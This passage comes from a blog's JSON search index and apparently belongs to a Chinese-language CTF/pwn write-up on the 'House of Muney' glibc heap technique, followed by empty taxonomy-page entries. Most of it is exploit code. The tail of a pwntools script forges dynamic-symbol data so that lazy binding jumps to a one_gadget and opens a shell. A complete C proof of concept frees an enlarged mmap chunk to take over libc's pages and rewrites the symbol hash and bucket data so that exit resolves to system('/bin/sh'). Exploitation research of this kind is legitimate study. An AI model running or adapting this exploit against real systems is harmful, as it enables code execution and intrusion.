STB_GLOBAL（全局符号）低4位：0x2 表示 STT_FUNC（函数类型） sym_value += p8(0) # st_other 通常为0 sym_value += p16(1) # st_shndx 1表示在代码节中 sym_value += p64(one_gadget) # st_value sym_value += p64(100) # st_size 随意设置,动态链接器通常不验证此字段 #dbg() edit(0, base_off + bloom_elem_off, p64(bloom_elem_val)) edit(0, base_off + bucket_elem_off, p32(bucket_elem_val)) edit(0, base_off + hasharr_off, p32(namehash)) edit(0, base_off + sym_off, sym_value) #gdb.attach(io, \u0026#34;b _dl_fixup\\nc\u0026#34;) io.sendlineafter(b\u0026#34;option:\u0026#34;, b\u0026#34;5\u0026#34;) io.interactive() POC #\r#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;stdint.h\u0026gt; #include \u0026lt;sys/mman.h\u0026gt; void main() { setbuf(stdin, 0); setbuf(stdout, 0); setbuf(stderr, 0); char *strptr = mmap(0xdeadb000, 0x1000, 6, 0x22, -1, 0); strcpy(strptr, \u0026#34;/bin/sh\u0026#34;); puts(\u0026#34;[*] step1: allocate a chunk ---\u0026gt; void* ptr = malloc(0x40000);\u0026#34;); size_t *ptr = (size_t *)malloc(0x40000); size_t sz = ptr[-1]; printf(\u0026#34;[*] ptr address: %p, chunk size: %p\\n\u0026#34;, ptr, (void *)sz); puts(\u0026#34;[*] step2: change the size of the chunk ---\u0026gt; ptr[-1] += 0x5000;\u0026#34;); ptr[-1] += 0x5000; puts(\u0026#34;[*] step3: free ptr and steal heap from glibc ---\u0026gt; free(ptr);\u0026#34;); free(ptr); puts(\u0026#34;[*] step4: retrieve heap ---\u0026gt; ptr = malloc(0x41000 * 2);\u0026#34;); ptr = malloc(0x41000 * 2); sz = ptr[-1]; printf(\u0026#34;[*] ptr address: %p, chunk size: %p\\n\u0026#34;, ptr, (void *)sz); // 当前ptr到原有libc基地址的偏移 size_t base_off = 0x7dff0; // 以下地址均是相对于libc基地址的偏移 size_t system_off = 0x52290; size_t bitmask_word_off = 0xb88; size_t bucket_off = 0xcb0; size_t exit_sym_st_value_off = 0x4d20; size_t hasharr_off = 0x1d7c; puts(\u0026#34;[*] step5: set essential data for dl_runtime_resolve\u0026#34;); *(size_t *)((char *)ptr + base_off + bitmask_word_off) = 0xf000028c0200130eul; puts(\u0026#34;[*] set bitmask_word to 0xf000028c0200130eul\u0026#34;); *(unsigned int *)((char *)ptr + base_off + bucket_off) = 0x86u; puts(\u0026#34;[*] set bucket to 0x86u\u0026#34;); *(size_t *)((char *)ptr + base_off + exit_sym_st_value_off) = system_off; puts(\u0026#34;[*] set exit@sym.st_value to system_off 0x52290\u0026#34;); *(size_t *)((char *)ptr + base_off + exit_sym_st_value_off - 8) = 0xf001200002efbul; puts(\u0026#34;[*] set other exit@sym members\u0026#34;); *(size_t *)((char *)ptr + base_off + hasharr_off) = 0x7c967e3e7c93f2a0ul; puts(\u0026#34;[*] set hasharr to 0x7c967e3e7c93f2a0ul\u0026#34;); puts(\u0026#34;[*] step6: get shell ---\u0026gt; exit(\\\u0026#34;/bin/sh\\\u0026#34;)\u0026#34;); exit(strptr); } ","externalUrl":null,"permalink":"/posts/pwn/heap/house-of-%E7%B3%BB%E5%88%97/house-of/house-of-muney/","section":"我的博客","summary":"","title":"","type":"posts"},{"content":"","externalUrl":null,"permalink":"/authors/","section":"Authors","summary":"","title":"Authors","type":"authors"},{"content":"","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"},{"content":"","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"}]